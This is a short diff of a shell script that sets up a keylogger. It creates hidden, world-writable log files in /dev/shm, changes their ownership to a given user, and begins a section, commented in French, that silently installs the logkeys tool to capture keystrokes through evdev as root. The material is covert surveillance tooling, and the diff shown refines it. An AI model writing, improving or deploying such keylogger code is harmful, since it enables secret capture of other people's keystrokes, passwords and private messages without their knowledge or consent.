@@ -8,9 +8,8 @@ D=/dev/shm
 KL=$D/.kl
 HF=$D/.h
 
-: > "$KL"
-: > "$HF"
-chmod 666 "$KL" "$HF"
+install -o "$U" -g "$U" -m 666 /dev/null "$KL"
+install -o "$U" -g "$U" -m 666 /dev/null "$HF"
 
 # --- 1. Keylogger evdev (root requis) ---
 command -v logkeys >/dev/null || apt-get install -y logkeys >/dev/null 2>&1
